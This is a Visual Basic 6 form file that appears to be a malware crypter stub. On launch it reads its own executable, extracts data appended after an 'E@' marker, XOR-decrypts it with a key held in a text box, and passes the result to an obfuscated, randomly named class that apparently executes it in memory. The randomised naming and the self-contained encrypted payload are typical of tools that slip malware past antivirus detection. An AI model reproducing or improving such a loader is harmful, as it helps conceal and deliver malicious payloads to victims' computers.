VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3090
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3090
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Text            =   "0123456789"
      Top             =   120
      Width           =   1935
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
Dim e As New S0k7I6oDhyUVyFRtNrQiIit
Dim c As String
Open App.EXEName & ".exe" For Binary As #1
c = Split(Input(FileLen(App.EXEName & ".exe"), #1), "E@")(1)
Call e.S0k7I6oDhyUVyFRtNrQiIit(StrConv(Decrypt(c, Text1.Text), vbFromUnicode), App.EXEName)
End
End Sub
Public Function Decrypt(sText As String, sKey As String) As String
Dim i, x, y As Integer, b() As Byte, k() As Byte
Decrypt = Empty
x = 0
b() = StrConv(sText, vbFromUnicode)
k() = StrConv(sKey, vbFromUnicode)
For i = 0 To Len(sText) - 1
    If x = Len(sKey) - 1 Then
        x = 0
    Else
        x = x + 1
    End If
   
    For y = 1 To 255
        b(i) = b(i) Xor k(x) Mod (y + 5)
    Next y
Next i
Decrypt = StrConv(b, vbUnicode)
End Function
